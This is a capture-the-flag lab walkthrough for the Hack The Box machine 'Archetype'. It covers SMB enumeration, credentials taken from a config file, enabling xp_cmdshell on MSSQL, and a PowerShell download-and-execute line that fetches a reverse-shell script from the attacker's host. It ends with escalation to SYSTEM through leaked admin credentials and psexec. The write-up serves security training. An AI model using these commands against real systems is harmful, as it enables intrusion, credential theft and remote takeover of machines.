# Archetype
---
### Initial Enumeration and Foothold

Running [[Nmap]] on Target IP  **10.10.10.27**
```bash
nmap -sV 10.10.10.27

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
```

Attempting to connect to 445 filsehare using [[SMBClient]]
```bash
smbclient -N -L \\\\10.10.10.27\\

| Sharename | Type | Comment       |
| --------- | ---- | ------------- |
| ADMIN$    | Disk | Remote Admin  |
| backups   | Disk |               |
| C$        | Disk | Default share |
| IPC$      | IPC  | Remote IPC    |

smbclient -N \\\\10.10.10.27\\backups
smb: \> dir
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020
smb: \> get prod.dtsConfig 
```

This file `prod.dtsConfig` provides the following credentials from an SQL server:
>Password=M3g4c0rp123
>User ID=ARCHETYPE\sql_svc
>Provider=SQLNCLI10

We can use [[impacket-mssqlclient]]  to access the SQL Server
```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
```

Configure to get RCE
```bash
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1reconfigure;
SQL> xp_cmdshell "whoami"
```
>archetype\sql_svc

Setup reverse shell listener on attacker with [[Netcat]]
```bash
nc -lnvp 1234
```

On attacking machine, create [[shell.ps1]] and host on webserver
```bash
vim shell.ps1
...
python3 -m http.server 8000
```

and execute SQL to connect to reverse shell
```bash
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.25:8000/shell.ps1\");"
```

---

### Privilege Escalation

Powershell history file reveals admin credentials
```bash
cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

Connect to powershell using [[impacket-psexec]]
```bash
impacket-psexec 'administrator:MEGACORP_4dm1n!!@10.10.10.27'
...
C:\Windows\system32>whoami
nt authority\system
```

Obtain `root.txt` Flag
```bash
C:\Users\Administrator\Desktop>type root.txt
```

---
Next Lab: [[02-Oopsie]]